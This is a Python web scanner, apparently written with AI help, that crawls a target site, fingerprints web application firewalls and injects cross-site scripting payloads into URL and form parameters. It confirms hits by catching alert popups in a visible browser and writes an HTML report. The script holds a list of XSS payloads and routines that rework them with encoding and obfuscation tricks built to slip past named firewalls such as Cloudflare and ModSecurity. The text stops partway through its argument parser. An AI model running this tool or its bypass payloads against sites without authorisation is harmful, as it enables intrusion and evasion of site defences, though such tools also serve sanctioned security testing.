#!/usr/bin/env python3
"""
Final Popup XSS Scanner - Perfect Version
Only takes screenshot when YOUR popup is displayed
Author: AI Assistant
Version: 17.0 Final
"""

import requests
import re
import urllib.parse
import time
import json
import threading
import os
import base64
import html
import signal
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import datetime
import random

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Initialize colorama
init()

class FinalPopupScanner:
    def __init__(self, target_url, max_threads=10, delay=0.1, max_depth=4, timeout=10):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.max_depth = max_depth
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Data structures
        self.visited_urls = set()
        self.discovered_params = set()
        self.confirmed_vulnerabilities = []
        self.waf_info = {}
        self.lock = threading.Lock()
        
        # Browser for validation - PERSISTENT
        self.browser = None
        self.playwright = None
        self.browser_context = None
        self.current_page = None
        
        # Enhanced payloads with encoding
        self.payloads = self._load_advanced_payloads()
        self.waf_bypass_encodings = self._load_waf_bypass_techniques()
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
        
        # Safe exit handling
        self.running = True
        signal.signal(signal.SIGINT, self._safe_exit)
        signal.signal(signal.SIGTERM, self._safe_exit)
    
    def _safe_exit(self, signum, frame):
        """Safe exit handler"""
        self.log("🛑 Safe exit requested...", "WARNING")
        self.running = False
        self._close_browser()
        self.log("✅ Safe exit completed", "SUCCESS")
        sys.exit(0)
    
    def log(self, message, level="INFO"):
        """Enhanced logging with better colors"""
        colors = {
            "INFO": Fore.WHITE,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.GREEN + Style.BRIGHT,
            "PHASE": Fore.CYAN + Style.BRIGHT,
            "TEST": Fore.WHITE,
            "WAF": Fore.YELLOW + Style.BRIGHT,
            "SCORE": Fore.GREEN + Style.BRIGHT,
            "PARAM": Fore.CYAN,
            "PAYLOAD": Fore.MAGENTA,
            "ALERT": Fore.RED + Style.BRIGHT,
            "BROWSER": Fore.BLUE + Style.BRIGHT,
            "SCREENSHOT": Fore.CYAN + Style.BRIGHT
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def _load_advanced_payloads(self):
        """Load advanced context-aware XSS payloads"""
        return {
            'html': [
                '<script>alert("XSS_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_CONFIRMED")>',
                '<svg onload=alert("XSS_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
                '<body onload=alert("XSS_CONFIRMED")>',
                '<details ontoggle=alert("XSS_CONFIRMED")>',
                '<marquee onstart=alert("XSS_CONFIRMED")>',
                '<video><source onerror=alert("XSS_CONFIRMED")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
                "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
                '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
                "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='",
                '" onclick="alert(\'XSS_CONFIRMED\')" x="',
                '" onload="alert(\'XSS_CONFIRMED\')" x="'
            ],
            'javascript': [
                '";alert("XSS_CONFIRMED");//',
                "';alert('XSS_CONFIRMED');//",
                '";prompt("XSS_CONFIRMED");//',
                "';prompt('XSS_CONFIRMED');//",
                '");alert("XSS_CONFIRMED");//',
                "');alert('XSS_CONFIRMED');//"
            ],
            'css': [
                'url("javascript:alert(\'XSS_CONFIRMED\')")',
                'expression(alert("XSS_CONFIRMED"))'
            ]
        }
    
    def _load_waf_bypass_techniques(self):
        """Load WAF bypass encoding techniques"""
        return {
            'url_encoding': lambda x: urllib.parse.quote(x),
            'double_url_encoding': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'html_encoding': lambda x: html.escape(x),
            'base64_encoding': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode_encoding': lambda x: x.encode('unicode_escape').decode(),
            'case_variation': lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            'null_byte': lambda x: x.replace('script', 'scri\x00pt'),
            'comment_injection': lambda x: x.replace('script', 'scr/**/ipt'),
            'tab_newline': lambda x: x.replace(' ', '\t').replace('>', '>\n')
        }
    
    def detect_waf(self, url):
        """Detect WAF presence and type"""
        self.log("Detecting WAF...", "WAF")
        
        waf_signatures = {
            'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'aws_waf': ['awsalb', 'awsalbcors'],
            'akamai': ['akamai', '_akamai'],
            'incapsula': ['incap_ses', 'visid_incap'],
            'sucuri': ['sucuri', 'x-sucuri'],
            'barracuda': ['barra', 'barracuda'],
            'f5_bigip': ['bigip', 'f5-bigip'],
            'mod_security': ['mod_security', 'modsecurity']
        }
        
        try:
            test_payload = '<script>alert(1)</script>'
            response = self.session.get(f"{url}?test={test_payload}", timeout=self.timeout)
            
            headers_str = str(response.headers).lower()
            content_str = response.text.lower()
            
            detected_wafs = []
            for waf_name, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature in headers_str or signature in content_str:
                        detected_wafs.append(waf_name)
                        break
            
            waf_patterns = [
                'access denied', 'blocked', 'security violation',
                'suspicious activity', 'web application firewall',
                'waf', 'forbidden'
            ]
            
            for pattern in waf_patterns:
                if pattern in content_str and response.status_code in [403, 406, 429, 503]:
                    detected_wafs.append('generic_waf')
                    break
            
            if detected_wafs:
                unique_wafs = list(set(detected_wafs))
                self.waf_info[url] = unique_wafs
                self.log(f"WAF detected: {', '.join(unique_wafs)}", "WAF")
                return unique_wafs
            else:
                self.log("No WAF detected", "WAF")
                return []
                
        except Exception as e:
            self.log(f"WAF detection error: {str(e)}", "ERROR")
            return []
    
    def bypass_waf_payload(self, payload, waf_types=None):
        """Apply WAF bypass techniques to payload"""
        if not waf_types:
            return [payload]
        
        bypassed_payloads = [payload]
        
        for technique_name, technique_func in self.waf_bypass_encodings.items():
            try:
                bypassed_payload = technique_func(payload)
                if bypassed_payload != payload:
                    bypassed_payloads.append(bypassed_payload)
            except:
                continue
        
        if 'cloudflare' in waf_types:
            cf_bypasses = [
                payload.replace('script', 'SCRIPT'),
                payload.replace('<script>', '<ScRiPt>'),
                payload.replace('alert', 'prompt'),
                payload.replace('>', '>\u0020')
            ]
            bypassed_payloads.extend(cf_bypasses)
        
        if 'mod_security' in waf_types:
            mod_bypasses = [
                payload.replace('script', 'scr\tipt'),
                payload.replace(' ', '\t'),
                payload.replace('=', '\u003d')
            ]
            bypassed_payloads.extend(mod_bypasses)
        
        return list(set(bypassed_payloads))
    
    def calculate_professional_score(self, vuln_data):
        """Calculate professional vulnerability score based on CVSS-like methodology"""
        score = 0
        
        # Base confirmation score (40 points)
        if vuln_data.get('confirmed', False):
            score += 40
        
        # Context scoring (20 points)
        context = vuln_data.get('context', 'html')
        context_scores = {
            'html': 20,
            'attribute': 15,
            'javascript': 25,
            'css': 10
        }
        score += context_scores.get(context, 15)
        
        # Parameter exposure scoring (15 points)
        param_name = vuln_data.get('parameter', '').lower()
        if any(keyword in param_name for keyword in ['search', 'query', 'q', 'user', 'name', 'email']):
            score += 15  # High exposure parameters
        elif any(keyword in param_name for keyword in ['id', 'cat', 'page', 'view']):
            score += 10  # Medium exposure parameters
        else:
            score += 5   # Low exposure parameters
        
        # WAF bypass bonus (10 points)
        if vuln_data.get('waf_bypassed', False):
            score += 10
        
        # Screenshot confirmation bonus (15 points) - INCREASED
        if vuln_data.get('screenshot'):
            score += 15
        
        # Alert execution confirmation (10 points)
        if 'XSS_CONFIRMED' in vuln_data.get('alert_message', ''):
            score += 10
        
        # Popup screenshot bonus (10 points) - INCREASED
        if vuln_data.get('popup_screenshot'):
            score += 10
        
        # Risk level classification
        if score >= 80:
            vuln_data['risk_level'] = 'HIGH'
        elif score >= 60:
            vuln_data['risk_level'] = 'MEDIUM'
        else:
            vuln_data['risk_level'] = 'LOW'
        
        return min(score, 100)
    
    def phase1_enhanced_reconnaissance(self):
        """Enhanced reconnaissance with parameter display"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 1: ENHANCED RECONNAISSANCE", "PHASE")
        self.log("=" * 80, "PHASE")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            waf_types = self.detect_waf(self.target_url)
            discovered_data = self._enhanced_crawl_parallel()
            
            self.log(f"Discovered {len(discovered_data['urls'])} URLs", "SUCCESS")
            self.log(f"Found {len(discovered_data['forms'])} forms", "SUCCESS")
            
            # Display discovered parameters
            self.log("=" * 50, "PARAM")
            self.log("DISCOVERED PARAMETERS FOR TESTING", "PARAM")
            self.log("=" * 50, "PARAM")
            
            if discovered_data['url_params']:
                self.log(f"URL Parameters ({len(discovered_data['url_params'])}):", "PARAM")
                for param in sorted(discovered_data['url_params']):
                    self.log(f"  • {param}", "PARAM")
            
            if discovered_data['form_params']:
                self.log(f"Form Parameters ({len(discovered_data['form_params'])}):", "PARAM")
                for param in sorted(discovered_data['form_params']):
                    self.log(f"  • {param}", "PARAM")
            
            self.log("=" * 50, "PARAM")
            
            return discovered_data
            
        except Exception as e:
            self.log(f"Phase 1 failed: {str(e)}", "ERROR")
            return None
    
    def _enhanced_crawl_parallel(self):
        """Enhanced parallel crawling - FIXED"""
        urls_to_visit = [(self.target_url, 0)]
        discovered_urls = set()
        all_forms = []
        all_url_params = set()
        all_form_params = set()
        base_domain = urlparse(self.target_url).netloc
        
        self.log(f"Starting crawl with base domain: {base_domain}", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while urls_to_visit and self.running:
                current_batch = []
                for _ in range(min(self.max_threads, len(urls_to_visit))):
                    if urls_to_visit:
                        current_batch.append(urls_to_visit.pop(0))
                
                if not current_batch:
                    break
                
                future_to_url = {}
                for url, depth in current_batch:
                    if (url not in self.visited_urls and 
                        depth <= self.max_depth and 
                        url not in discovered_urls):
                        future = executor.submit(self._crawl_single_url, url, depth, base_domain)
                        future_to_url[future] = (url, depth)
                
                for future in as_completed(future_to_url):
                    if not self.running:
                        break
                    url, depth = future_to_url[future]
                    try:
                        result = future.result()
                        if result:
                            discovered_urls.add(url)
                            self.visited_urls.add(url)
                            
                            all_forms.extend(result['forms'])
                            all_url_params.update(result['url_params'])
                            all_form_params.update(result['form_params'])
                            
                            for new_url in result['links']:
                                if (new_url not in discovered_urls and 
                                    new_url not in self.visited_urls and
                                    depth < self.max_depth):
                                    urls_to_visit.append((new_url, depth + 1))
                    
                    except Exception as e:
                        self.log(f"Error processing {url}: {str(e)}", "ERROR")
                        continue
                
                time.sleep(self.delay)
        
        return {
            'urls': list(discovered_urls),
            'forms': all_forms,
            'url_params': list(all_url_params),
            'form_params': list(all_form_params)
        }
    
    def _crawl_single_url(self, url, depth, base_domain):
        """Crawl a single URL"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            response.raise_for_status()
            
            parsed_url = urlparse(url)
            url_params = set(parse_qs(parsed_url.query).keys())
            
            forms = self._extract_forms_enhanced(response.text, url)
            form_params = set()
            for form in forms:
                for input_field in form['inputs']:
                    if input_field['name']:
                        form_params.add(input_field['name'])
            
            links = self._extract_links_enhanced(response.text, url, base_domain)
            
            return {
                'url_params': url_params,
                'form_params': form_params,
                'forms': forms,
                'links': links
            }
            
        except Exception as e:
            return None
    
    def _extract_forms_enhanced(self, html_content, base_url):
        """Enhanced form extraction"""
        forms = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'url': base_url,
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                }
                form_data['inputs'].append(input_data)
            
            if form_data['action']:
                form_data['action'] = urljoin(base_url, form_data['action'])
            else:
                form_data['action'] = base_url
            
            forms.append(form_data)
        
        return forms
    
    def _extract_links_enhanced(self, html_content, base_url, base_domain):
        """Enhanced link extraction - FIXED"""
        links = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract all possible links from various sources
        link_sources = []
        
        # 1. Regular <a> tags
        for link in soup.find_all('a', href=True):
            link_sources.append(link['href'])
        
        # 2. Form actions
        for form in soup.find_all('form', action=True):
            if form['action']:
                link_sources.append(form['action'])
        
        # 3. JavaScript redirects and window.location
        js_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
            r'window\.open\s*\(\s*["\']([^"\']+)["\']',
            r'href\s*=\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            link_sources.extend(matches)
        
        # Process all found links
        for href in link_sources:
            if href and not href.startswith('#') and not href.startswith('javascript:'):
                full_url = urljoin(base_url, href)
                parsed = urlparse(full_url)
                if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                    links.append(full_url)
        
        # Remove duplicates
        return list(set(links))
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def phase2_final_popup_validation(self, recon_data):
        """Final popup validation with perfect screenshot timing"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 2: FINAL POPUP VALIDATION", "PHASE")
        self.log("=" * 80, "PHASE")
        
        if not PLAYWRIGHT_AVAILABLE:
            self.log("Playwright not available, skipping browser validation", "WARNING")
            return
        
        if not self._init_persistent_browser():
            self.log("Browser initialization failed", "ERROR")
            return
        
        try:
            self.log("🌐 Browser initialized - will stay open throughout Phase 2", "BROWSER")
            self._test_all_parameters_final_popup(recon_data)
        finally:
            self._close_browser()
    
    def _init_persistent_browser(self):
        """Initialize persistent browser"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=False,  # Show browser for live demonstration
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            self.browser_context = self.browser.new_context()
            self.current_page = self.browser_context.new_page()
            
            return True
        except Exception as e:
            self.log(f"Browser init error: {str(e)}", "ERROR")
            return False
    
    def _close_browser(self):
        """Close browser safely"""
        try:
            if self.current_page:
                self.current_page.close()
            if self.browser_context:
                self.browser_context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
            self.log("🔒 Browser closed safely", "BROWSER")
        except Exception as e:
            self.log(f"Browser close error: {str(e)}", "ERROR")
    
    def _test_all_parameters_final_popup(self, recon_data):
        """Test parameters with final popup screenshot"""
        # Test URL parameters
        for url in recon_data['urls']:
            if not self.running:
                break
            self._test_url_parameters_final_popup(url)
        
        # Test form parameters
        for form in recon_data['forms']:
            if not self.running:
                break
            self._test_form_parameters_final_popup(form)
    
    def _test_url_parameters_final_popup(self, url):
        """Test URL parameters with final popup screenshot"""
        parsed_url = urlparse(url)
        url_params = parse_qs(parsed_url.query)
        
        for param_name in url_params:
            if not self.running:
                break
            self.log(f"Testing URL parameter: {param_name} on {url}", "TEST")
            
            waf_types = self.waf_info.get(url, [])
            base_payloads = self.payloads['html']
            
            for base_payload in base_payloads:
                if not self.running:
                    break
                bypass_payloads = self.bypass_waf_payload(base_payload, waf_types)
                
                for payload in bypass_payloads:
                    if not self.running:
                        break
                    self.log(f"  Payload: {payload}", "PAYLOAD")
                    self.log(f"  Context: HTML", "PAYLOAD")
                    self.log(f"  WAF Bypass: {'Yes' if len(bypass_payloads) > 1 else 'No'}", "PAYLOAD")
                    
                    success = self._validate_xss_final_popup(url, None, payload, param_name, waf_types)
                    if success:
                        break
                
                if success:
                    break
    
    def _test_form_parameters_final_popup(self, form):
        """Test form parameters with final popup screenshot"""
        for input_field in form['inputs']:
            if not self.running:
                break
            if input_field['name']:
                self.log(f"Testing form parameter: {input_field['name']} on {form['action']}", "TEST")
                
                waf_types = self.waf_info.get(form['action'], [])
                base_payloads = self.payloads['html']
                
                for base_payload in base_payloads:
                    if not self.running:
                        break
                    bypass_payloads = self.bypass_waf_payload(base_payload, waf_types)
                    
                    for payload in bypass_payloads:
                        if not self.running:
                            break
                        self.log(f"  Payload: {payload}", "PAYLOAD")
                        self.log(f"  Context: HTML", "PAYLOAD")
                        self.log(f"  WAF Bypass: {'Yes' if len(bypass_payloads) > 1 else 'No'}", "PAYLOAD")
                        
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        success = self._validate_xss_final_popup(form['action'], form_data, payload, input_field['name'], waf_types)
                        if success:
                            break
                    
                    if success:
                        break
    
    def _validate_xss_final_popup(self, url, form_data, payload, param_name, waf_types):
        """Final popup validation - ONLY takes screenshot when YOUR popup is displayed"""
        try:
            # Create a new page for this test to avoid dialog conflicts
            test_page = self.browser_context.new_page()
            
            # Set up dialog handler for THIS specific test
            dialog_handled = False
            alert_message = ""
            screenshot_path = None
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message, screenshot_path
                try:
                    dialog_handled = True
                    alert_message = dialog.message
                    
                    self.log(f"  🚨 ALERT DETECTED: {dialog.message}", "ALERT")
                    
                    # CRITICAL: Only take screenshot if it's YOUR specific popup
                    if "XSS_CONFIRMED" in dialog.message:
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"popup_xss_{param_name}_{timestamp}.png"
                        screenshot_path = os.path.join('screenshots', filename)
                        
                        try:
                            # Take screenshot immediately when YOUR popup appears - FIXED TIMEOUT
                            test_page.screenshot(path=screenshot_path, full_page=True, timeout=10000)
                            self.log(f"  📸 YOUR POPUP SCREENSHOT CAPTURED: {screenshot_path}", "SCREENSHOT")
                        except Exception as e:
                            self.log(f"  ❌ Screenshot error: {str(e)}", "ERROR")
                            # Try without full_page if timeout
                            try:
                                test_page.screenshot(path=screenshot_path, timeout=5000)
                                self.log(f"  📸 YOUR POPUP SCREENSHOT CAPTURED (no full_page): {screenshot_path}", "SCREENSHOT")
                            except Exception as e2:
                                self.log(f"  ❌ Screenshot error (retry): {str(e2)}", "ERROR")
                                screenshot_path = None
                    
                    # Wait to see the popup clearly
                    time.sleep(1)
                    
                    # Accept dialog
                    try:
                        dialog.accept()
                    except Exception as e:
                        self.log(f"  ⚠️ Dialog accept error: {str(e)}", "WARNING")
                        
                except Exception as e:
                    self.log(f"  ❌ Dialog handler error: {str(e)}", "ERROR")
            
            # Set up dialog handler for this test page
            test_page.on("dialog", handle_dialog)
            
            if form_data:
                # Form submission
                test_page.goto(url, wait_until="domcontentloaded", timeout=30000)
                
                # Fill form
                for field_name, field_value in form_data.items():
                    try:
                        test_page.fill(f'[name="{field_name}"]', str(field_value))
                    except:
                        continue
                
                # Submit form
                try:
                    test_page.click('input[type="submit"], button[type="submit"], button')
                except:
                    pass
                
                test_page.wait_for_load_state("domcontentloaded", timeout=30000)
            else:
                # Direct URL
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                test_page.goto(test_url, wait_until="domcontentloaded", timeout=30000)
            
            # Wait for XSS execution
            time.sleep(3)
            
            # Check if XSS was triggered with YOUR popup
            if dialog_handled and "XSS_CONFIRMED" in alert_message:
                # Calculate professional score
                vuln_data = {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'context': 'html',
                    'screenshot': screenshot_path,
                    'timestamp': datetime.datetime.now().isoformat(),
                    'alert_message': alert_message,
                    'confirmed': True,
                    'waf_bypassed': len(waf_types) > 0,
                    'popup_screenshot': screenshot_path is not None
                }
                
                score = self.calculate_professional_score(vuln_data)
                vuln_data['score'] = score
                
                with self.lock:
                    self.confirmed_vulnerabilities.append(vuln_data)
                    self.log(f"✅ CONFIRMED XSS! Parameter: {param_name}", "VULN")
                    self.log(f"Score: {score}/100 ({vuln_data['risk_level']})", "SCORE")
                    if vuln_data['screenshot']:
                        self.log(f"YOUR POPUP Screenshot: {vuln_data['screenshot']}", "VULN")
                    if vuln_data['popup_screenshot']:
                        self.log(f"YOUR POPUP Screenshot: ✅ Captured Successfully", "SCREENSHOT")
                
                # Close test page
                test_page.close()
                return True
            
            # Close test page if no XSS found
            test_page.close()
            return False
            
        except Exception as e:
            self.log(f"Browser validation error: {str(e)}", "ERROR")
            try:
                test_page.close()
            except:
                pass
            return False
    
    def generate_final_popup_report(self):
        """Generate final popup HTML report"""
        self.log("Generating final popup report...", "INFO")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'final_popup_report_{timestamp}.html')
        
        # Calculate statistics
        total_vulns = len(self.confirmed_vulnerabilities)
        confirmed_vulns = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
        avg_score = sum(v.get('score', 0) for v in self.confirmed_vulnerabilities) / max(total_vulns, 1)
        high_risk = len([v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'HIGH'])
        popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Final Popup XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; }}
        .container {{ max-width: 1200px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 30px; }}
        .stat {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
        .vulnerability {{ background: #f8f9fa; border-left: 5px solid #28a745; margin: 20px; padding: 25px; border-radius: 8px; }}
        .vulnerability.high-risk {{ border-left-color: #dc3545; background: #fff5f5; }}
        .vulnerability.medium-risk {{ border-left-color: #ffc107; background: #fffbf0; }}
        .vulnerability.low-risk {{ border-left-color: #28a745; background: #f0fff4; }}
        .screenshot {{ max-width: 100%; border: 1px solid #ddd; border-radius: 8px; margin: 15px 0; }}
        .score-badge {{ display: inline-block; color: white; padding: 5px 15px; border-radius: 20px; font-weight: bold; }}
        .score-badge.high {{ background: #dc3545; }}
        .score-badge.medium {{ background: #ffc107; color: #333; }}
        .score-badge.low {{ background: #28a745; }}
        .risk-badge {{ display: inline-block; padding: 3px 10px; border-radius: 15px; font-size: 0.8em; font-weight: bold; }}
        .risk-high {{ background: #dc3545; color: white; }}
        .risk-medium {{ background: #ffc107; color: #333; }}
        .risk-low {{ background: #28a745; color: white; }}
        .payload-display {{ background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }}
        .alert-info {{ background: #e3f2fd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #2196f3; }}
        .popup-screenshot {{ border: 3px solid #ff6b6b; box-shadow: 0 0 20px rgba(255, 107, 107, 0.3); }}
        .popup-badge {{ background: #ff6b6b; color: white; padding: 3px 8px; border-radius: 10px; font-size: 0.8em; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Final Popup XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">{total_vulns}</div>
                <div>Total Vulnerabilities</div>
            </div>
            <div class="stat">
                <div class="stat-number">{confirmed_vulns}</div>
                <div>Confirmed XSS</div>
            </div>
            <div class="stat">
                <div class="stat-number">{avg_score:.1f}</div>
                <div>Average Score</div>
            </div>
            <div class="stat">
                <div class="stat-number">{high_risk}</div>
                <div>High Risk</div>
            </div>
            <div class="stat">
                <div class="stat-number">{popup_screenshots}</div>
                <div>YOUR Popup Screenshots</div>
            </div>
        </div>
        
        <div style="padding: 30px;">
            <h2>🎯 Vulnerability Details</h2>
"""
        
        if not self.confirmed_vulnerabilities:
            html_content += '<div style="text-align: center; padding: 40px; color: #28a745; font-size: 1.2em;">✅ No vulnerabilities found</div>'
        else:
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                score = vuln.get('score', 0)
                risk_level = vuln.get('risk_level', 'LOW')
                score_class = 'high' if score >= 80 else 'medium' if score >= 60 else 'low'
                risk_class = f"risk-{risk_level.lower()}"
                vuln_class = f"{risk_level.lower()}-risk"
                
                html_content += f"""
                <div class="vulnerability {vuln_class}">
                    <h3>🔍 Vulnerability #{i} 
                        <span class="score-badge {score_class}">Score: {score}/100</span>
                        <span class="risk-badge {risk_class}">{risk_level} RISK</span>
                        {f'<span class="popup-badge">YOUR POPUP SCREENSHOT</span>' if vuln.get('popup_screenshot', False) else ''}
                    </h3>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                    <p><strong>Payload:</strong></p>
                    <div class="payload-display">{html.escape(vuln['payload'])}</div>
                    <p><strong>Context:</strong> {vuln.get('context', 'N/A')}</p>
                    <p><strong>Confirmed:</strong> {'✅ Yes' if vuln.get('confirmed', False) else '⚠️ Potential'}</p>
                    <p><strong>WAF Bypassed:</strong> {'✅ Yes' if vuln.get('waf_bypassed', False) else '❌ No'}</p>
                    <div class="alert-info">
                        <strong>Alert Message:</strong> {vuln.get('alert_message', 'N/A')}
                    </div>
                    <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                    
                    {f'<img src="../{vuln["screenshot"]}" alt="YOUR XSS Popup Screenshot" class="screenshot popup-screenshot">' if vuln.get('screenshot') else ''}
                </div>
"""
        
        html_content += """
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Final popup report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method with safe exit"""
        start_time = time.time()
        
        self.log("🚀 Starting Final Popup XSS Scanner v17.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("Press Ctrl+C for safe exit", "INFO")
        self.log("🎯 ONLY takes screenshots when YOUR popup is displayed!", "SCREENSHOT")
        
        try:
            # Phase 1: Enhanced reconnaissance
            recon_data = self.phase1_enhanced_reconnaissance()
            if not recon_data or not self.running:
                return
            
            # Phase 2: Final popup validation
            self.phase2_final_popup_validation(recon_data)
            
            # Generate report
            if self.running:
                report_path = self.generate_final_popup_report()
                
                # Show results
                self._show_final_results(report_path)
            
            elapsed_time = time.time() - start_time
            self.log(f"Scan completed in {elapsed_time:.2f} seconds", "SUCCESS")
            
        except KeyboardInterrupt:
            self.log("🛑 Scan interrupted by user", "WARNING")
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
        finally:
            self._close_browser()
    
    def _show_final_results(self, report_path):
        """Show final results with perfect scoring"""
        self.log("=" * 80, "PHASE")
        self.log("SCAN RESULTS", "PHASE")
        self.log("=" * 80, "PHASE")
        
        total_vulns = len(self.confirmed_vulnerabilities)
        confirmed_vulns = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
        popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
        
        self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
        self.log(f"Confirmed XSS: {confirmed_vulns}", "SUCCESS")
        self.log(f"YOUR Popup screenshots: {popup_screenshots}", "SCREENSHOT")
        
        if self.confirmed_vulnerabilities:
            avg_score = sum(v.get('score', 0) for v in self.confirmed_vulnerabilities) / total_vulns
            self.log(f"Average score: {avg_score:.1f}/100", "SCORE")
            
            high_risk_vulns = [v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'HIGH']
            medium_risk_vulns = [v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'MEDIUM']
            low_risk_vulns = [v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'LOW']
            
            if high_risk_vulns:
                self.log(f"High-risk vulnerabilities: {len(high_risk_vulns)}", "WARNING")
            if medium_risk_vulns:
                self.log(f"Medium-risk vulnerabilities: {len(medium_risk_vulns)}", "WARNING")
            if low_risk_vulns:
                self.log(f"Low-risk vulnerabilities: {len(low_risk_vulns)}", "SUCCESS")
        
        if report_path:
            self.log(f"📊 Final Popup Report: {report_path}", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(description='Final Popup XSS Scanner v17.0')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
    parser.add_argument('--depth', type=int, default=4, help='Crawling depth (default: 4)')
